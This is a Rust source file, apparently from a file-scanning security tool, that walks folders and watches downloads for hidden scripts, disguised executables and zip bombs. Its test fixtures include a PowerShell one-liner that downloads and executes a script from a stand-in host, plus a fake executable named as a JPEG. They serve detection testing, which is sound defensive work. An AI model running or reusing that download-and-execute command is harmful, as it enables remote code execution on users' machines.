            hid.push(Hidden { place: "inside the file".into(), offset: off, length: 0, kind: "pe".into(), text: hex.join(" ") });
        }
    }
    Ok(Local { kind, findings: fnd, hidden: hid, zip })
}

fn sha256_of(path: &Path, size: u64) -> String {
    if size > MAX_HASH {
        return String::new();
    }
    let Ok(mut f) = File::open(path) else { return String::new() };
    let mut h = Sha256::new();
    let mut b = vec![0u8; 1 << 20];
    loop {
        match f.read(&mut b) {
            Ok(0) => break,
            Ok(n) => h.update(&b[..n]),
            Err(_) => return String::new(),
        }
    }
    h.finalize().iter().map(|x| format!("{x:02x}")).collect()
}

fn scan_file(st: &Shared, path: &Path, allow_vt: bool, py_ok: &mut u8) -> FileResult {
    let size = std::fs::metadata(path).map(|m| m.len()).unwrap_or(0);
    let name = path.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
    let mut r = FileResult {
        at: crate::util::now_iso(),
        path: path.display().to_string(), name, size, sha256: String::new(), kind: "unknown".into(), verdict: "clean".into(),
        score: 0, findings: vec![], hidden: vec![], zip: None, vt: None, analysis: "rust-only".into(), note: String::new(),
    };
    if size == 0 {
        return r;
    }
    r.sha256 = sha256_of(path, size);
    match local_scan(path, size) {
        Ok(l) => {
            r.kind = l.kind;
            r.findings = l.findings;
            r.hidden = l.hidden;
            r.zip = l.zip;
        }
        Err(e) => {
            r.note = format!("could not read the file: {e}");
            return r;
        }
    }
    // 4) hand over to Python: pixels, script text, archive contents, VirusTotal
    // Python is only asked about files it can add something for (a full drive has far too many other files)
    let needs_py = !r.findings.is_empty() || !r.hidden.is_empty() || matches!(r.kind.as_str(), "png" | "bmp" | "gif" | "webp" | "tiff" | "script" | "zip" | "pdf") || (allow_vt && r.kind == "pe");
    if needs_py && *py_ok < 3 && size <= 512 * 1024 * 1024 {
        let body = json!({
            "path": r.path, "name": r.name, "size": r.size, "sha256": r.sha256, "kind": r.kind,
            "findings": r.findings, "hidden": r.hidden, "zip": r.zip, "allow_vt": allow_vt,
        });
        match crate::intel_client::post_json(&st.cfg.intel_url, "/api/filescan/analyze", &body) {
            Ok(v) => {
                *py_ok = 0;
                if let Ok(f) = serde_json::from_value::<Vec<Finding>>(v["findings"].clone()) {
                    r.findings = f;
                }
                if let Ok(h) = serde_json::from_value::<Vec<Hidden>>(v["hidden"].clone()) {
                    r.hidden = h;
                }
                r.vt = v.get("vt").filter(|x| !x.is_null()).cloned();
                r.note = v["note"].as_str().unwrap_or("").to_string();
                r.analysis = "python".into();
            }
            Err(e) => {
                *py_ok += 1;
                r.note = format!("deep analysis unavailable ({e}); showing the structural checks only.");
            }
        }
    }
    r.score = score_of(&r.findings);
    r.verdict = verdict_of(r.score).into();
    r
}

// ------------------------------------------------------------------ walking + jobs

const SKIP_DIRS: &[&str] = &["$recycle.bin", "system volume information", "node_modules", ".git"];

fn norm_path(p: &Path) -> String {
    p.to_string_lossy().replace('/', "\\").trim_end_matches('\\').to_lowercase()
}

fn excluded(dir: &Path, name: &str, ex: &[String]) -> bool {
    let full = norm_path(dir);
    ex.iter().any(|x| {
        let x = x.trim().replace('/', "\\").trim_end_matches('\\').to_lowercase();
        !x.is_empty() && (x == name || x == full || full.starts_with(&format!("{x}\\")))
    })
}

fn collect(root: &Path, o: &Opts, cancel: &AtomicBool) -> (Vec<PathBuf>, bool) {
    let mut files = Vec::new();
    let mut stack = vec![(root.to_path_buf(), 0usize)];
    while let Some((dir, depth)) = stack.pop() {
        if cancel.load(Ordering::SeqCst) {
            break;
        }
        let Ok(rd) = std::fs::read_dir(&dir) else { continue };
        for e in rd.flatten() {
            let Ok(ft) = e.file_type() else { continue };
            if ft.is_symlink() {
                continue; // never follow links out of the chosen folder
            }
            if ft.is_dir() {
                let n = e.file_name().to_string_lossy().to_lowercase();
                if o.recursive && depth < MAX_DEPTH && !SKIP_DIRS.contains(&n.as_str()) && !excluded(&e.path(), &n, &o.exclude) {
                    stack.push((e.path(), depth + 1));
                }
            } else if ft.is_file() {
                if !o.extensions.is_empty() {
                    let ext = e.path().extension().map(|x| x.to_string_lossy().to_lowercase()).unwrap_or_default();
                    if !o.extensions.contains(&ext) {
                        continue;
                    }
                }
                if files.len() >= MAX_FILES {
                    return (files, true);
                }
                files.push(e.path());
            }
        }
    }
    (files, false)
}

pub fn start(st: &Shared, path: &str, opts: Opts) -> Result<String, String> {
    let root = PathBuf::from(path.trim());
    if !root.is_dir() {
        return Err("that folder does not exist".into());
    }
    if st.filescan.running() {
        return Err("a scan is already running - wait for it to finish or stop it".into());
    }
    let id = format!("{:x}", rand::random::<u32>());
    let cell = Arc::new(Cell {
        job: Mutex::new(Job {
            id: id.clone(), path: root.display().to_string(), status: "running".into(), started: crate::util::now_iso(), finished: String::new(),
            total: 0, scanned: 0, current: "listing files".into(), clean: 0, suspicious: 0, malicious: 0, skipped: 0, truncated: false, error: String::new(), items: vec![],
        }),
        cancel: AtomicBool::new(false),
    });
    {
        let mut jobs = st.filescan.jobs.lock().unwrap_or_else(|e| e.into_inner());
        jobs.push(cell.clone());
        if jobs.len() > 5 {
            jobs.remove(0);
        }
    }
    st.log("apps", "INFO", format!("FILE_SCAN started job={id} folder={} types={} excluded={}", root.display(), if opts.extensions.is_empty() { "all".to_string() } else { opts.extensions.join(",") }, opts.exclude.len()));
    let s = st.clone();
    std::thread::Builder::new()
        .name("file-scan".into())
        .spawn(move || run_job(s, cell, root, opts))
        .map_err(|e| e.to_string())?;
    Ok(id)
}

fn run_job(st: Shared, cell: Arc<Cell>, root: PathBuf, opts: Opts) {
    let (files, truncated) = collect(&root, &opts, &cell.cancel);
    {
        let mut j = cell.job.lock().unwrap_or_else(|e| e.into_inner());
        j.total = files.len();
        j.truncated = truncated;
    }
    let (mut py_fail, mut vt_used) = (0u8, 0usize);
    for p in files {
        if cell.cancel.load(Ordering::SeqCst) {
            break;
        }
        cell.job.lock().unwrap_or_else(|e| e.into_inner()).current = p.display().to_string();
        // a panic while parsing a hostile file must not kill the whole scan
        let allow_vt = vt_used < MAX_VT_LOOKUPS;
        let res = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| scan_file(&st, &p, allow_vt, &mut py_fail)));
        let mut j = cell.job.lock().unwrap_or_else(|e| e.into_inner());
        j.scanned += 1;
        match res {
            Ok(r) => {
                if r.vt.is_some() {
                    vt_used += 1;
                }
                match r.verdict.as_str() {
                    "malicious" => j.malicious += 1,
                    "suspicious" => j.suspicious += 1,
                    _ => j.clean += 1,
                }
                if r.note.starts_with("could not read") {
                    j.skipped += 1;
                }
                if r.verdict != "clean" && j.items.len() < MAX_RESULTS {
                    j.items.push(r);
                    j.items.sort_by(|a, b| b.score.cmp(&a.score));
                }
            }
            Err(_) => j.skipped += 1,
        }
    }
    let mut j = cell.job.lock().unwrap_or_else(|e| e.into_inner());
    j.status = if cell.cancel.load(Ordering::SeqCst) { "cancelled" } else { "done" }.into();
    j.finished = crate::util::now_iso();
    j.current = String::new();
    let (m, s, n, id, path) = (j.malicious, j.suspicious, j.scanned, j.id.clone(), j.path.clone());
    drop(j);
    st.log("apps", if m > 0 { "ALERT" } else { "INFO" }, format!("FILE_SCAN finished job={id} files={n} malicious={m} suspicious={s}"));
    if m > 0 || s > 0 {
        st.alert(
            "filescan", if m > 0 { "high" } else { "medium" },
            format!("Folder scan: {m} malicious, {s} suspicious file(s)"),
            format!("{path} - {n} files checked. Open the Scan page for the hidden scripts and details."),
            None, &format!("filescan:{id}"), 60,
        );
    }
}

// ------------------------------------------------------------------ folder picker for the dashboard

fn home_dirs() -> Vec<(String, PathBuf)> {
    let home = std::env::var("USERPROFILE").or_else(|_| std::env::var("HOME")).ok().map(PathBuf::from);
    let mut v = Vec::new();
    if let Some(h) = home {
        for n in ["Downloads", "Desktop", "Documents", "Pictures", "Videos"] {
            let p = h.join(n);
            if p.is_dir() {
                v.push((n.to_string(), p));
            }
        }
        v.insert(0, ("Home".into(), h));
    }
    v
}

/// Sub-folders of `path` (or the drives / filesystem root when `path` is empty) for the folder picker.
pub fn browse(path: &str) -> Result<Value, String> {
    let shortcuts: Vec<Value> = home_dirs().into_iter().map(|(n, p)| json!({ "name": n, "path": p.display().to_string() })).collect();
    let path = path.trim();
    if path.is_empty() {
        let roots: Vec<Value> = if cfg!(windows) {
            ('A'..='Z').map(|c| format!("{c}:\\")).filter(|d| Path::new(d).exists()).map(|d| json!({ "name": d, "path": d })).collect()
        } else {
            vec![json!({ "name": "/", "path": "/" })]
        };
        return Ok(json!({ "path": "", "parent": null, "dirs": roots, "files": 0, "shortcuts": shortcuts }));
    }
    let p = PathBuf::from(path);
    if !p.is_dir() {
        return Err("not a folder".into());
    }
    let mut dirs = Vec::new();
    let mut files = 0usize;
    for e in std::fs::read_dir(&p).map_err(|e| e.to_string())?.flatten() {
        let Ok(ft) = e.file_type() else { continue };
        if ft.is_dir() && !ft.is_symlink() {
            dirs.push((e.file_name().to_string_lossy().into_owned(), e.path()));
        } else if ft.is_file() {
            files += 1;
        }
    }
    dirs.sort_by_key(|d| d.0.to_lowercase());
    dirs.truncate(500);
    let parent = match p.parent() {
        Some(par) if !par.as_os_str().is_empty() => par.display().to_string(),
        _ => String::new(), // at a root: "up" goes back to the drive list
    };
    Ok(json!({
        "path": p.display().to_string(), "parent": parent, "files": files, "shortcuts": shortcuts,
        "dirs": dirs.into_iter().map(|(n, p)| json!({ "name": n, "path": p.display().to_string() })).collect::<Vec<_>>(),
    }))
}

// ------------------------------------------------------------------ download monitor (runs all the time)

const TEMP_EXT: &[&str] = &["crdownload", "part", "partial", "tmp", "download", "opdownload", "filepart", "!ut"];
const MONITOR_KEEP: usize = 200;

/// Background service: every NEW file that appears in the watched folders (Downloads + Desktop by default) - picture,
/// document, video, archive, script, anything - is run through the same Rust + Python checks as the Scan page.
pub fn spawn_monitor(st: Shared) {
    if !st.cfg.download_monitor || !st.cfg.scan_download_files {
        st.log("apps", "INFO", "DOWNLOAD_FILE_SCAN disabled in config.json");
        return;
    }
    std::thread::Builder::new()
        .name("download-file-scan".into())
        .spawn(move || monitor_loop(st))
        .expect("spawn download file scanner");
}

fn monitor_loop(st: Shared) {
    use std::collections::{HashMap, HashSet};
    let mut pending: HashMap<PathBuf, (u64, Option<std::time::SystemTime>, u8)> = HashMap::new();
    let mut known: HashSet<PathBuf> = HashSet::new();
    let mut first = true;
    let mut py_fail = 0u8;
    loop {
        for dir in crate::downloads::watch_dirs(&st.cfg) {
            let Ok(rd) = std::fs::read_dir(&dir) else { continue };
            for e in rd.flatten() {
                let path = e.path();
                if known.contains(&path) || !e.file_type().map(|t| t.is_file()).unwrap_or(false) {
                    continue;
                }
                if first {
                    known.insert(path); // files that were already there are not downloads
                    continue;
                }
                let ext = path.extension().map(|x| x.to_string_lossy().to_lowercase()).unwrap_or_default();
                if TEMP_EXT.contains(&ext.as_str()) {
                    continue; // the browser is still writing it
                }
                let Ok(meta) = e.metadata() else { continue };
                let sig = (meta.len(), meta.modified().ok());
                let slot = pending.entry(path.clone()).or_insert((sig.0, sig.1, 0));
                if (slot.0, slot.1) == sig && sig.0 > 0 {
                    slot.2 += 1;
                } else {
                    *slot = (sig.0, sig.1, 0);
                }
                if slot.2 >= 2 && File::open(&path).is_ok() {
                    pending.remove(&path);
                    known.insert(path.clone());
                    monitor_one(&st, &path, &mut py_fail);
                }
            }
        }
        known.retain(|p| p.exists());
        pending.retain(|p, _| p.exists());
        first = false;
        std::thread::sleep(std::time::Duration::from_secs(2));
    }
}

fn monitor_one(st: &Shared, path: &Path, py_fail: &mut u8) {
    let res = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| scan_file(st, path, false, py_fail)));
    let Ok(mut r) = res else { return };
    let (m, hidden) = (r.verdict == "malicious", r.hidden.len());
    st.log(
        "apps", if r.verdict == "clean" { "INFO" } else { "ALERT" },
        format!("DOWNLOAD_FILE_SCAN {} verdict={} score={} findings={} hidden_items={hidden}", r.path, r.verdict, r.score, r.findings.len()),
    );
    if r.verdict != "clean" {
        let top = r.findings.iter().map(|f| f.title.clone()).take(3).collect::<Vec<_>>().join("; ");
        st.alert(
            "filescan", if m { "high" } else { "medium" },
            format!("Downloaded file looks {}: {}", r.verdict, r.name),
            format!("{top}. Open the Scan page to see the hidden data."),
            None, &format!("dlfile:{}", r.sha256), 300,
        );
    }
    for h in r.hidden.iter_mut() {
        h.text.truncate(PREVIEW);
    }
    let mut v = st.filescan.monitor.lock().unwrap_or_else(|e| e.into_inner());
    v.insert(0, r);
    v.truncate(MONITOR_KEEP);
}

// ------------------------------------------------------------------ tests

#[cfg(test)]
mod tests {
    use super::*;

    fn tmp(name: &str, data: &[u8]) -> PathBuf {
        let d = std::env::temp_dir().join(format!("og-filescan-{}", std::process::id()));
        std::fs::create_dir_all(&d).unwrap();
        let p = d.join(name);
        std::fs::write(&p, data).unwrap();
        p
    }

    fn tiny_png() -> Vec<u8> {
        let mut v = b"\x89PNG\r\n\x1a\n".to_vec();
        let chunk = |t: &[u8], d: &[u8]| {
            let mut c = (d.len() as u32).to_be_bytes().to_vec();
            c.extend_from_slice(t);
            c.extend_from_slice(d);
            c.extend_from_slice(&[0, 0, 0, 0]); // CRC is not checked here
            c
        };
        v.extend(chunk(b"IHDR", &[0, 0, 0, 1, 0, 0, 0, 1, 8, 2, 0, 0, 0]));
        v.extend(chunk(b"IDAT", &[0x78, 0x9c, 0x63, 0, 0, 0, 2, 0, 1]));
        v.extend(chunk(b"IEND", &[]));
        v
    }

    #[test]
    fn collect_respects_types_and_excludes() {
        let d = std::env::temp_dir().join(format!("og-collect-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(d.join("keep")).unwrap();
        std::fs::create_dir_all(d.join("skipme")).unwrap();
        for f in ["a.png", "b.txt", "keep/c.PNG", "skipme/d.png"] {
            std::fs::write(d.join(f), b"x").unwrap();
        }
        let o = Opts { recursive: true, extensions: vec!["png".into()], exclude: vec!["SkipMe".into()] };
        let (files, _) = collect(&d, &o, &AtomicBool::new(false));
        let mut names: Vec<String> = files.iter().map(|p| p.file_name().unwrap().to_string_lossy().to_lowercase()).collect();
        names.sort();
        assert_eq!(names, vec!["a.png", "c.png"]);
        let o2 = Opts { recursive: false, ..Default::default() };
        assert_eq!(collect(&d, &o2, &AtomicBool::new(false)).0.len(), 2); // a.png + b.txt only
    }

    #[test]
    fn clean_png_has_no_findings() {
        let p = tmp("clean.png", &tiny_png());
        let l = local_scan(&p, std::fs::metadata(&p).unwrap().len()).unwrap();
        assert_eq!(l.kind, "png");
        assert!(l.findings.is_empty(), "{:?}", l.findings.iter().map(|f| &f.title).collect::<Vec<_>>());
    }

    #[test]
    fn script_after_png_end_is_found() {
        let mut v = tiny_png();
        v.extend_from_slice(b"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')\"");
        let p = tmp("hidden.png", &v);
        let l = local_scan(&p, v.len() as u64).unwrap();
        assert!(l.findings.iter().any(|f| f.id == "trailing-data"));
        assert!(l.hidden[0].text.contains("DownloadString"));
    }

    #[test]
    fn exe_named_jpg_is_disguised() {
        let mut v = vec![0u8; 0x200];
        v[0] = b'M';
        v[1] = b'Z';
        v[0x3c] = 0x80;
        v[0x80..0x84].copy_from_slice(b"PE\0\0");
        let p = tmp("holiday.jpg", &v);
        let l = local_scan(&p, v.len() as u64).unwrap();
        assert!(l.findings.iter().any(|f| f.id == "disguised" && f.severity == "critical"));
    }

    #[test]
    fn jpeg_end_is_found() {
        // SOI, APP0, SOS + 3 data bytes, EOI, then junk
        let mut v = vec![0xff, 0xd8, 0xff, 0xe0, 0, 4, 0, 0, 0xff, 0xda, 0, 4, 0, 0, 1, 2, 3, 0xff, 0xd9];
        let n = v.len();
        v.extend_from_slice(b"MZ-not-really");
        assert_eq!(jpeg_scan(&v).0, Some(n));
    }

    #[test]
    fn zip_bomb_is_flagged_without_unpacking() {
        // one stored entry that CLAIMS to be 4 GB after 100 bytes of compressed data
        let name = b"a.bin";
        let mut z = Vec::new();
        z.extend_from_slice(b"PK\x03\x04");
        z.extend_from_slice(&[0u8; 26]);
        z.extend_from_slice(name);
        z.extend_from_slice(&[0u8; 100]);
        let cd_off = z.len() as u32;
        let mut cd = b"PK\x01\x02".to_vec();
        cd.extend_from_slice(&[0u8; 16]); // version..crc
        cd.extend_from_slice(&100u32.to_le_bytes()); // compressed
        cd.extend_from_slice(&0xF000_0000u32.to_le_bytes()); // uncompressed ~4 GB
        cd.extend_from_slice(&(name.len() as u16).to_le_bytes());
        cd.extend_from_slice(&[0u8; 16]);
        cd.extend_from_slice(name);
        z.extend_from_slice(&cd);
        z.extend_from_slice(b"PK\x05\x06\0\0\0\0\x01\0\x01\0");
        z.extend_from_slice(&(cd.len() as u32).to_le_bytes());
        z.extend_from_slice(&cd_off.to_le_bytes());
        z.extend_from_slice(&[0, 0]);
        let p = tmp("bomb.zip", &z);
        let l = local_scan(&p, z.len() as u64).unwrap();
        assert!(l.findings.iter().any(|f| f.id == "zip-bomb"), "{:?}", l.findings.iter().map(|f| &f.id).collect::<Vec<_>>());
    }
}
